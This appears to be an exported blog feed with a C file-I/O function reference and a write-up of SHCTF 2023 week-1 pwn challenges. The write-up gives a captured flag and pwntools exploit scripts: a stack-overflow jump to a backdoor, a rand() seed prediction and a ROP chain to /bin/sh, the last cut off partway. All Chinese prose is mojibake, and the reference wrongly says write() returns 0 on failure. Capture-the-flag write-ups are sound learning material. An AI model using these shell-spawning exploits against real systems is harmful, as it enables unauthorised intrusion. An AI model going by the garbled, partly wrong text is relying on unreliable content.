<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">fgets</span><span class="params">(<span class="type">char</span> *str, <span class="type">int</span> n, FILE *stream)</span>;</span><br></pre></td></tr></table></figure>

<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li><code>str</code>ï¼šæŒ‡å‘å­—ç¬¦æ•°ç»„çš„æŒ‡é’ˆï¼Œè¯»å–çš„å­—ç¬¦ä¸²å°†å­˜å‚¨åœ¨è¿™é‡Œã€‚</li>
<li><code>n</code>ï¼šè¦è¯»å–çš„æœ€å¤§å­—ç¬¦æ•°ï¼ˆåŒ…æ‹¬æœ€ç»ˆçš„ null å­—ç¬¦ï¼‰ã€‚</li>
<li><code>stream</code>ï¼šæŒ‡å‘ FILE å¯¹è±¡çš„æŒ‡é’ˆï¼Œè¯¥å¯¹è±¡æ ‡è¯†ä»ä¸­è¯»å–å­—ç¬¦çš„æµã€‚</li>
</ul>
<p>åœæ­¢è¯»å–çš„æ¡ä»¶ï¼š</p>
<ul>
<li>è¯»å–äº† <code>n-1</code> ä¸ªå­—ç¬¦ï¼›</li>
<li>è¯»å–äº†æ¢è¡Œç¬¦ï¼›</li>
<li>åˆ°è¾¾æ–‡ä»¶æœ«å°¾ã€‚</li>
</ul>
<p>è¿”å›å€¼ï¼š</p>
<ul>
<li>æˆåŠŸï¼šè¿”å› <code>str</code>ï¼›</li>
<li>å¤±è´¥æˆ– EOFï¼šè¿”å› <code>NULL</code>ï¼Œ<code>str</code> ä¸å˜ã€‚</li>
</ul>
<hr>
<h2><span id="fclose">fclose</span></h2><p><code>fclose</code> ä¸»è¦ç”¨äºå…³é—­ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶æµï¼ŒåŒæ—¶åˆ·æ–°æ‰€æœ‰ç¼“å†²åŒºã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fclose</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure>

<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li><code>stream</code>ï¼šæŒ‡å‘è¦å…³é—­çš„æ–‡ä»¶æµå¯¹è±¡ã€‚</li>
</ul>
<p>è¿”å›å€¼ï¼š</p>
<ul>
<li>æˆåŠŸï¼šè¿”å› <code>0</code>ï¼›</li>
<li>å¤±è´¥ï¼šè¿”å› <code>EOF</code>ã€‚</li>
</ul>
<hr>
<h2><span id="fopen">fopen</span></h2><p><code>fopen</code> ä¸»è¦ä½œç”¨æ˜¯æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ä»¥è¿›è¡Œå„ç§æ“ä½œï¼ˆè¯»ã€å†™ã€è¿½åŠ ç­‰ï¼‰ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *<span class="title function_">fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span>;</span><br></pre></td></tr></table></figure>

<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li><code>filename</code>ï¼šè¦æ‰“å¼€çš„æ–‡ä»¶åã€‚</li>
<li><code>mode</code>ï¼šæ–‡ä»¶è®¿é—®æ¨¡å¼ï¼š</li>
</ul>
<table>
<thead>
<tr>
<th>æ¨¡å¼</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td><code>&quot;r&quot;</code></td>
<td>ä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶ï¼Œæ–‡ä»¶ä¸å­˜åœ¨åˆ™è¿”å› <code>NULL</code>ã€‚</td>
</tr>
<tr>
<td><code>&quot;w&quot;</code></td>
<td>ä»¥å†™æ–¹å¼æ‰“å¼€æ–‡ä»¶ï¼Œæ–‡ä»¶å­˜åœ¨åˆ™æ¸…ç©ºï¼Œä¸å­˜åœ¨åˆ™åˆ›å»ºæ–°æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td><code>&quot;a&quot;</code></td>
<td>ä»¥è¿½åŠ æ–¹å¼å†™å…¥æ–‡ä»¶æœ«å°¾ï¼Œä¸å­˜åœ¨åˆ™åˆ›å»ºã€‚</td>
</tr>
<tr>
<td><code>&quot;r+&quot;</code></td>
<td>æ‰“å¼€å¯è¯»å¯å†™æ–‡ä»¶ï¼Œæ–‡ä»¶ä¸å­˜åœ¨è¿”å› <code>NULL</code>ã€‚</td>
</tr>
<tr>
<td><code>&quot;w+&quot;</code></td>
<td>å¯è¯»å†™ï¼Œæ–°å»ºæˆ–æ¸…ç©ºæ–‡ä»¶å†…å®¹ã€‚</td>
</tr>
<tr>
<td><code>&quot;a+&quot;</code></td>
<td>å¯è¯»å¯å†™ï¼Œè¿½åŠ åˆ°æ–‡ä»¶æœ«å°¾ï¼Œä¸å­˜åœ¨åˆ™æ–°å»ºã€‚</td>
</tr>
</tbody></table>
<p>è¿”å›å€¼ï¼š</p>
<ul>
<li>æˆåŠŸï¼šè¿”å› <code>FILE*</code> æŒ‡é’ˆï¼›</li>
<li>å¤±è´¥ï¼šè¿”å› <code>NULL</code>ã€‚</li>
</ul>
<hr>
<h2><span id="fwrite">fwrite</span></h2><p><code>fwrite</code> å°†æ•°æ®ä» <code>ptr</code> æŒ‡å‘çš„æ•°ç»„å†™å…¥åˆ°ç»™å®šæµä¸­ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span>;</span><br></pre></td></tr></table></figure>

<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li><code>ptr</code>ï¼šæŒ‡å‘è¦å†™å…¥çš„å†…å­˜åŒºåŸŸï¼›</li>
<li><code>size</code>ï¼šå•ä¸ªå…ƒç´ çš„å¤§å°ï¼ˆå­—èŠ‚ï¼‰ï¼›</li>
<li><code>nmemb</code>ï¼šå†™å…¥çš„å…ƒç´ æ•°é‡ï¼›</li>
<li><code>stream</code>ï¼šç›®æ ‡æ–‡ä»¶æµæŒ‡é’ˆã€‚</li>
</ul>
<p>è¿”å›å€¼ï¼š</p>
<ul>
<li>å®é™…å†™å…¥çš„å…ƒç´ æ•°é‡ï¼Œç±»å‹ä¸º <code>size_t</code>ï¼›</li>
<li>è‹¥ä¸ç­‰äº <code>nmemb</code>ï¼Œè¯´æ˜å‡ºé”™æˆ–å†™å…¥ä¸å®Œæ•´ã€‚</li>
</ul>
<hr>
<h2><span id="write">write</span></h2><p><code>write</code> å°†æ•°æ®ä»ç¼“å†²åŒºå†™å…¥æ–‡ä»¶æè¿°ç¬¦ï¼ˆä½å±‚ç³»ç»Ÿè°ƒç”¨ï¼‰ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>

<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li><code>fd</code>ï¼šæ–‡ä»¶æè¿°ç¬¦ï¼ˆ<code>1</code> è¡¨ç¤ºæ ‡å‡†è¾“å‡ºï¼‰ï¼›</li>
<li><code>buf</code>ï¼šè¦å†™å…¥çš„æ•°æ®ç¼“å†²åŒºï¼›</li>
<li><code>count</code>ï¼šè¦å†™å…¥çš„å­—èŠ‚æ•°ã€‚</li>
</ul>
<p>è¿”å›å€¼ï¼š</p>
<ul>
<li>æˆåŠŸï¼šè¿”å›å†™å…¥çš„å­—èŠ‚æ•°ï¼›</li>
<li>å¤±è´¥ï¼šè¿”å› <code>0</code>ã€‚</li>
</ul>
<hr>
<h2><span id="fread">fread</span></h2><p><code>fread</code> ä»æŒ‡å®šæ–‡ä»¶æµä¸­è¯»å–æ•°æ®ï¼Œå­˜å‚¨åˆ°ç»™å®šç¼“å†²åŒºä¸­ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span>;</span><br></pre></td></tr></table></figure>

<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li><code>ptr</code>ï¼šæŒ‡å‘æ¥æ”¶æ•°æ®çš„å†…å­˜ï¼›</li>
<li><code>size</code>ï¼šæ¯ä¸ªå…ƒç´ çš„å¤§å°ï¼ˆå­—èŠ‚ï¼‰ï¼›</li>
<li><code>nmemb</code>ï¼šè¯»å–çš„å…ƒç´ æ•°é‡ï¼›</li>
<li><code>stream</code>ï¼šè¾“å…¥æµæŒ‡é’ˆã€‚</li>
</ul>
<p>è¿”å›å€¼ï¼š</p>
<ul>
<li>å®é™…è¯»å–çš„å…ƒç´ æ•°é‡ï¼ˆ<code>size_t</code>ï¼‰ï¼›</li>
<li>è‹¥å°‘äº <code>nmemb</code>ï¼Œå¯èƒ½æ˜¯ EOF æˆ–å‡ºé”™ã€‚</li>
</ul>
<hr>
<h2><span id="read">read</span></h2><p><code>read</code> æ˜¯ä¸€ä¸ªä½å±‚å‡½æ•°ï¼Œä»æ–‡ä»¶æè¿°ç¬¦è¯»å–æ•°æ®åˆ°å†…å­˜ç¼“å†²åŒºã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>

<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li><code>fd</code>ï¼šæ–‡ä»¶æè¿°ç¬¦ï¼ˆä¾‹å¦‚ï¼Œ<code>0</code> è¡¨ç¤ºæ ‡å‡†è¾“å…¥ï¼‰ï¼›</li>
<li><code>buf</code>ï¼šç¼“å†²åŒºï¼›</li>
<li><code>count</code>ï¼šè¦è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°ã€‚</li>
</ul>
<p>è¿”å›å€¼ï¼š</p>
<ul>
<li>æˆåŠŸï¼šè¯»å–çš„å­—èŠ‚æ•°ï¼›</li>
<li>å¤±è´¥ï¼šè¿”å› <code>-1</code>ï¼Œå¹¶è®¾ç½® <code>errno</code>ã€‚</li>
</ul>
<hr>
<h1><span id="æ€»ç»“">æ€»ç»“:</span></h1><p>äº†è§£å‡½æ•°çš„ä½œç”¨ï¼Œå¯ä»¥æ›´å¥½åœ°è®©æˆ‘ä»¬åœ¨ä»£ç å®¡è®¡çš„è¿‡ç¨‹ä¸­ç†æ¸…ç¨‹åºä¹‹é—´çš„é€»è¾‘ï¼ŒåŠ æ²¹åŠ æ²¹ï¼ï¼ï¼</p>
]]></content>
      <categories>
        <category>æŠ€å·§</category>
        <category>æ–¹æ³•</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>SHCTF 2023 [WEEK 1] PWN</title>
    <url>/SHCTF%202023%20%5BWEEK%201%5D%20PWN/</url>
    <content><![CDATA[<p>SHCTF 2023 [WEEK 1] PWN</p>
<span id="more"></span>

<h1><span id="ç®€ä»‹">ç®€ä»‹</span></h1><p><strong>SHCTF - &quot;å±±æ²³&quot;ç½‘ç»œå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ›</strong> æ˜¯ç”±é½é²å·¥ä¸šå¤§å­¦ã€è¥¿å®‰é‚®ç”µå¤§å­¦ã€å¹¿ä¸œæµ·æ´‹å¤§å­¦ã€é•¿æ˜¥å·¥ç¨‹å­¦é™¢ã€éƒ‘å·è½»å·¥ä¸šå¤§å­¦ã€æ²³å—å¤§å­¦ã€é½é²å¸ˆèŒƒå­¦é™¢ã€é™•è¥¿é‚®ç”µèŒä¸šæŠ€æœ¯å­¦é™¢ã€é™•è¥¿å·¥ä¸šèŒä¸šæŠ€æœ¯å­¦é™¢ã€å•†ä¸˜å¸ˆèŒƒå­¦é™¢ã€å’¸é˜³å¸ˆèŒƒå­¦é™¢ï¼ˆæ’åä¸åˆ†å…ˆåï¼‰ç­‰åæ‰€é«˜æ ¡å…±åŒä¸¾åŠçš„ CTF æ¯”èµ›ã€‚</p>
<p>å®Œç»“æ’’èŠ±ï¼ï¼ï¼è¿™æ¬¡æ¯”èµ›æ”¶è·å¾ˆå¤§ï¼Œæ–°ç”Ÿèµ›å¾€å¾€ä¼šè®©ä½ æ”¶è·æ„æƒ³ä¸åˆ°çš„çŸ¥è¯†ç‚¹ï¼ŒæŒºå¥½çš„ï¼Œäººæ°‘çš„å¥½æ¯”èµ›ï¼Œæ”¯æŒæ”¯æŒï¼Œæ˜å¹´å†æ¥ -_-ï¼Œæ¥ä¸‹æ¥ä¼šæŠŠæ¯”èµ›åˆ†å‘¨åˆ†äº«è®°å½•ä¸‹æ¥ã€‚</p>
<hr>
<h2><span id="nc">nc</span></h2><p>ç­¾åˆ°é¢˜ï¼Œç›´æ¥ <code>nc</code> å°±å®Œäº‹äº†ã€‚</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/1.png"></p>
<hr>
<h2><span id="hard-nc">hard nc</span></h2><p>ç­¾åˆ°é¢˜ï¼Œè€ƒå¯Ÿéšè—æ–‡ä»¶çš„æŸ¥è¯¢ï¼ˆ<code>ls -a</code>ï¼‰ï¼Œç„¶åå°±æ˜¯ base64 è§£ç ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag&#123;636a6981-8e07-42ea-aa5e-bcd2bfb11441&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/2.png"></p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/3.png"></p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/4.png"></p>
<hr>
<h2><span id="å››åˆ™è®¡ç®—å™¨">å››åˆ™è®¡ç®—å™¨</span></h2><p>idaåæ±‡ç¼–ä¸€ä¸‹ï¼Œä»£ç å®¡è®¡å‘ç°å‡ºç°äº†æ ˆæº¢å‡ºï¼Œå¹¶ä¸”è¿˜æœ‰ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œæƒ³æ³•å°±æ˜¯å…ˆç»•è¿‡ if è¯­å¥ï¼Œå†è°ƒç”¨åé—¨å‡½æ•°ï¼Œè·å¾—shell</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/5.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>, <span class="number">32837</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">backdoor = <span class="number">0x4015E4</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x32</span> + <span class="number">7</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ï¼Œä¹Ÿå¯ä»¥é€šè¿‡nopæ»‘æ¢¯æ¥è§£å†³ï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>, <span class="number">30541</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">backdoor = <span class="number">0x4015E4</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x32</span> + p64(<span class="number">0</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="çŒœæ•°æ¸¸æˆ">çŒœæ•°æ¸¸æˆ</span></h2><p>idaåæ±‡ç¼–ï¼Œä»£ç å®¡è®¡å‘ç°æœ‰ä¸ªåé—¨å‡½æ•° fun11 ï¼Œæƒ³åŠæ³•è°ƒç”¨åé—¨å‡½æ•°ï¼Œé¦–å…ˆå…ˆå¾—ç»•è¿‡ if å‡½æ•°ï¼Œè¾“å…¥å°äºç­‰äº11çš„å°±è¡Œï¼Œç„¶åå°±æ˜¯æƒ³åŠæ³•è·³å‡ºwhileå¾ªç¯ï¼Œè¿™å°±éœ€è¦çœ‹ compare å‡½æ•°ï¼Œè‹¥sä¸v6ç›¸ç­‰ï¼Œåˆ™è·³å‡ºå¾ªç¯ï¼Œç„¶åå°±è¦çœ‹åˆ°int_num_to_ascii å‡½æ•°ï¼ˆè¯¥å‡½æ•°ä¸»è¦åŠŸèƒ½æ˜¯å°†ä¸€ä¸ªæ•´æ•°è½¬æ¢ä¸ºASCIIå­—ç¬¦æ•°ç»„ï¼‰å°†ä¸€ä¸ªéšæœºæ•°è½¬åŒ–ä¸ºascllç å€¼èµ‹å€¼ç»™v6ï¼Œå¹¶ä¸”sæ˜¯ç”¨æˆ·è¾“å…¥çš„å€¼ï¼Œå°±å¯ä»¥è¾“å…¥éšæœºæ•°è®©å…¶ç­‰äºv6ï¼Œè¿™æ ·å°±å¯ä»¥è·å¾—shelläº†ï¼Œç›´æ¥å¹²å°±å®Œäº‹äº†</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/6.png"></p>
<p>ä¸»è¦è¿˜å¾—è®¤çœŸç†æ¸…ä»£ç ä¸­çš„é€»è¾‘ï¼Œè¿™æ ·æ‰å¥½è§£å†³é—®é¢˜</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>, <span class="number">32854</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line">num = <span class="built_in">str</span>(libc.rand())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;how many digit you think about this number?\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">11</span>))</span><br><span class="line">p.sendline(num)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ropchain">ropchain</span></h2><p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œ64ä½æ‰“å¼€äº†canaryå’ŒNXï¼Œç„¶åè¿˜æ˜¯ä¸ªé™æ€é“¾æ¥çš„ç¨‹åº</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/7.png"></p>
<p>idaåæ±‡ç¼–ï¼Œè§‚å¯Ÿäº†ä¸€ä¸‹ï¼Œä½ ä¼šå‘ç°åªæœ‰readè¿™é‡Œå‘ç”Ÿäº†æº¢å‡ºï¼Œç„¶ååˆæ˜¯é™æ€é“¾æ¥ï¼Œå¯ä»¥ç›´æ¥ç”¨ROPgadgetå»å¯»æ‰¾ropæ‰§è¡Œæµï¼ˆä¸æ‡‚å¯çœ‹è¿™é‡Œ<a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(2)/">PWN PWN PWN !!! æŠ€å·§ (2)</a>ï¼‰</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/8.png"></p>
<p> ä½¿ç”¨ <code>ROPgadget --binary æ–‡ä»¶ --ropchain</code> ç”Ÿæˆæ„é€ é“¾ã€‚</p>
<p>è¿™æ ·çš„è¯å°±å¯ä»¥ç›´æ¥æ„é€ payloadäº†ï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span></span><br><span class="line"><span class="comment">#io =process(&#x27;./111&#x27;)</span></span><br><span class="line">io =remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">30578</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000419a1c</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000041ac41</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000417e25</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000041ac41</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401d1d</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401858</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000417e25</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; 